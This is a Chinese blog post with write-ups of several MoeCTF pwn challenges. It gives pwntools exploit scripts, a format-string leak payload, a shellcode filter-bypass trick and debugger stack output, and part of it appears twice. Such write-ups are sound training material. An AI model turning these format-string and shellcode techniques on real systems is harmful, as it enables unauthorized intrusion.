<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 6.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="baby_calculator123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level&#x3D;&amp;#x27;debug&amp;#x27;context.terminal&#x3D;[&amp;#x2">
<meta property="og:type" content="article">
<meta property="og:title" content="moectfwp">
<meta property="og:url" content="http://example.com/2023/11/09/moectfwp/index.html">
<meta property="og:site_name" content="xingkong的博客">
<meta property="og:description" content="baby_calculator123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context.log_level&#x3D;&amp;#x27;debug&amp;#x27;context.terminal&#x3D;[&amp;#x2">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2023-11-09T11:27:23.000Z">
<meta property="article:modified_time" content="2023-11-09T11:32:20.991Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/2023/11/09/moectfwp/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>moectfwp | xingkong的博客</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">xingkong的博客</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">菜狗一只</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/09/moectfwp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="John Doe">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="xingkong的博客">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          moectfwp
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-11-09 19:27:23 / 修改时间：19:32:20" itemprop="dateCreated datePublished" datetime="2023-11-09T19:27:23+08:00">2023-11-09</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn/" itemprop="url" rel="index"><span itemprop="name">Pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h1 id="baby-calculator"><a href="#baby-calculator" class="headerlink" title="baby_calculator"></a>baby_calculator</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_result</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cat_the_x</span>(<span class="params">a</span>):</span><br><span class="line"></span><br><span class="line">	lst=[]</span><br><span class="line">	s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">		<span class="keyword">if</span> a[i]==<span class="string">&#x27;:&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&lt;=<span class="string">&#x27;9&#x27;</span> <span class="keyword">and</span> a[i+<span class="number">1</span>]&gt;=<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">			lst.append(a[i+<span class="number">1</span>:<span class="built_in">len</span>(a)-<span class="number">1</span>])</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(lst))</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">50241</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;1:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;2:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;3:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;4:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;5:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;6:&#x27;</span>,p.recvline())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;7:&#x27;</span>,p.recvline())</span><br><span class="line"></span><br><span class="line">x=cat_the_x(p.recvline().decode())</span><br><span class="line">y=cat_the_x(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;x:&#x27;</span>,x)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;y:&#x27;</span>,y)</span><br><span class="line">result=cat_the_result(p.recvline().decode())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;result:&#x27;</span>,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> x+y==result:</span><br><span class="line">	p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">99</span>):</span><br><span class="line">	x=cat_the_x(p.recvline().decode())</span><br><span class="line">	y=cat_the_x(p.recvline().decode())</span><br><span class="line">	result=cat_the_result(p.recvline().decode())</span><br><span class="line">	<span class="keyword">if</span> x+y==result:</span><br><span class="line">		p.sendline(<span class="string">&#x27;BlackBird&#x27;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p.sendline(<span class="string">&#x27;WingS&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="changeable-shellcode"><a href="#changeable-shellcode" class="headerlink" title="changeable_shellcode"></a>changeable_shellcode</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">40</span>]; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your shellcode: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x28</span>uLL);</span><br><span class="line">  filter(buf, <span class="number">40</span>);</span><br><span class="line">  MEMORY[<span class="number">0x114514000</span>] = *(_QWORD *)buf;</span><br><span class="line">  MEMORY[<span class="number">0x114514008</span>] = *(_QWORD *)&amp;buf[<span class="number">8</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514010</span>] = *(_QWORD *)&amp;buf[<span class="number">16</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514018</span>] = *(_QWORD *)&amp;buf[<span class="number">24</span>];</span><br><span class="line">  MEMORY[<span class="number">0x114514020</span>] = *(_QWORD *)&amp;buf[<span class="number">32</span>];</span><br><span class="line">  JUMPOUT(<span class="number">0x114514000</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读取输入，然后处理输入，然后把输入的东西mov到指定地址，然后再跳转过去。看一下处理函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; len - <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( buf[i] == <span class="string">&#x27;\x0F&#x27;</span> &amp;&amp; buf[i + <span class="number">1</span>] == <span class="number">5</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Is that &#x27;syscall&#x27;?&quot;</span>);</span><br><span class="line">      buf[i] = <span class="number">0</span>;</span><br><span class="line">      buf[i + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Oh, nothing.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不能含有\x0f\x05,而shellcode中<code>syscall</code>的字节码就是\x0f\x05,所以我们要把最后的\x05换成其他的字节，然后在发送shellcode之前再加上一句汇编把地址末尾处的值改为\x05.</p>
<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><p>fd文件描述符，在linux中一切皆文件，用来表示打开文件的索引，fd的索引从0开始最大为你操作文件总数减一。</p>
<p>其中0，1，2被默认为标准输入，标准输出，标准错误输出。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v8 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  input = <span class="number">0</span>;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know fd?&quot;</span>);</span><br><span class="line">  fd = open(<span class="string">&quot;./flag&quot;</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  new_fd = (<span class="number">4</span> * fd) | <span class="number">0x29A</span>;</span><br><span class="line">  dup2(fd, new_fd);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Which file do you want to read?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input its fd: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;input);</span><br><span class="line">  read(input, flag, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(flag);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

<p>打开了flag文件，并记录了文件描述符，最后输入flag时，不是通过默认的键盘标准输入，而是让你指定一个fd，把fd赋值为flag文件的描述符，程序就从flag文件中输入到变量中。程序中间把fd关闭了，但是有一个复制操作。</p>
<p>我们可以输入操作符为(4*3)|0X29A&#x3D;670</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;fd&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">52596</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;fd&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;fd: &#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">670</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="format-level0"><a href="#format-level0" class="headerlink" title="format_level0"></a>format_level0</h1><p>格式化字符串漏洞gdb动调发现flag位于栈中的第7个位置，但不知道长度所以多输入几个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ esp 0xffffcf80 ◂— 0x0</span><br><span class="line">01:0004│     0xffffcf84 ◂— 0x1</span><br><span class="line">02:0008│     0xffffcf88 ◂— 0x3</span><br><span class="line">03:000c│     0xffffcf8c ◂— &#x27;flag&#123;gdygf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">04:0010│     0xffffcf90 ◂— &#x27;&#123;gdygf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">05:0014│     0xffffcf94 ◂— &#x27;gf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">06:0018│     0xffffcf98 ◂— &#x27;y32yqhduha&#125;\n&#x27;</span><br><span class="line">07:001c│     0xffffcf9c ◂— &#x27;qhduha&#125;\n&#x27;</span><br><span class="line">08:0020│     0xffffcfa0 ◂— &#x27;ha&#125;\n&#x27;</span><br><span class="line">09:0024│     0xffffcfa4 ◂— 0x0</span><br><span class="line">... ↓        13 skipped</span><br><span class="line">17:005c│     0xffffcfdc ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span><br><span class="line">... ↓        13 skipped</span><br><span class="line">25:0094│     0xffffd014 ◂— &#x27;aaa\n&#x27;</span><br><span class="line">26:0098│     0xffffd018 ◂— 0x0</span><br><span class="line">... ↓        4 skipped</span><br><span class="line">2b:00ac│     0xffffd02c ◂— 0xa4d3e900</span><br><span class="line">2c:00b0│     0xffffd030 —▸ 0xffffd050 ◂— 0x1</span><br><span class="line">2d:00b4│     0xffffd034 —▸ 0xf7fa5000 ◂— 0x229dac</span><br><span class="line">2e:00b8│ ebp 0xffffd038 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— 0x464c457f</span><br><span class="line">2f:00bc│     0xffffd03c —▸ 0xf7d9c519 ◂— add esp, 0x10</span><br><span class="line">30:00c0│     0xffffd040 —▸ 0xffffd2c4 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">31:00c4│     0xffffd044 ◂— 0x70 /* &#x27;p&#x27; */</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">64814</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%7$x%8$x%9$x%10$x%11$x%12$x%13$x%14$x%15$x%16$x&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">b=p.recv()</span><br><span class="line"><span class="comment">#print(&#x27;a:&#x27;,a)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b:&#x27;</span>,b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到了flag的16进制格式，转成字符串</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">a=<span class="number">0x63656f6d7a7b6674595848355758456e417879614e417647325f324e30497875325051547d30466e</span></span><br><span class="line">b=long_to_bytes(<span class="built_in">int</span>(a))</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(b),<span class="number">4</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i+<span class="number">3</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i+<span class="number">2</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i + <span class="number">1</span>]), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(b[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>格式化字符串漏洞gdb动调发现flag位于栈中的第7个位置，但不知道长度所以多输入几个</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; stack 50</span><br><span class="line">00:0000│ esp 0xffffcf80 ◂— 0x0</span><br><span class="line">01:0004│     0xffffcf84 ◂— 0x1</span><br><span class="line">02:0008│     0xffffcf88 ◂— 0x3</span><br><span class="line">03:000c│     0xffffcf8c ◂— &#x27;flag&#123;gdygf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">04:0010│     0xffffcf90 ◂— &#x27;&#123;gdygf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">05:0014│     0xffffcf94 ◂— &#x27;gf71y32yqhduha&#125;\n&#x27;</span><br><span class="line">06:0018│     0xffffcf98 ◂— &#x27;y32yqhduha&#125;\n&#x27;</span><br><span class="line">07:001c│     0xffffcf9c ◂— &#x27;qhduha&#125;\n&#x27;</span><br><span class="line">08:0020│     0xffffcfa0 ◂— &#x27;ha&#125;\n&#x27;</span><br><span class="line">09:0024│     0xffffcfa4 ◂— 0x0</span><br><span class="line">... ↓        13 skipped</span><br><span class="line">17:005c│     0xffffcfdc ◂— &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n&#x27;</span><br><span class="line">... ↓        13 skipped</span><br><span class="line">25:0094│     0xffffd014 ◂— &#x27;aaa\n&#x27;</span><br><span class="line">26:0098│     0xffffd018 ◂— 0x0</span><br><span class="line">... ↓        4 skipped</span><br><span class="line">2b:00ac│     0xffffd02c ◂— 0xa4d3e900</span><br><span class="line">2c:00b0│     0xffffd030 —▸ 0xffffd050 ◂— 0x1</span><br><span class="line">2d:00b4│     0xffffd034 —▸ 0xf7fa5000 ◂— 0x229dac</span><br><span class="line">2e:00b8│ ebp 0xffffd038 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 —▸ 0x56555000 ◂— 0x464c457f</span><br><span class="line">2f:00bc│     0xffffd03c —▸ 0xf7d9c519 ◂— add esp, 0x10</span><br><span class="line">30:00c0│     0xffffd040 —▸ 0xffffd2c4 ◂— 0x6d6f682f (&#x27;/hom&#x27;)</span><br><span class="line">31:00c4│     0xffffd044 ◂— 0x70 /* &#x27;p&#x27; */</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;-sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;192.168.23.1&#x27;</span>,<span class="number">64814</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%7$x%8$x%9$x%10$x%11$x%12$x%13$x%14$x%15$x%16$x&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line">b=p.recv()</span><br><span class="line"><span class="comment">#print(&#x27;a:&#x27;,a)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;b:&#x27;</span>,b)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>得到了flag的16进制格式，转成字符串</p>
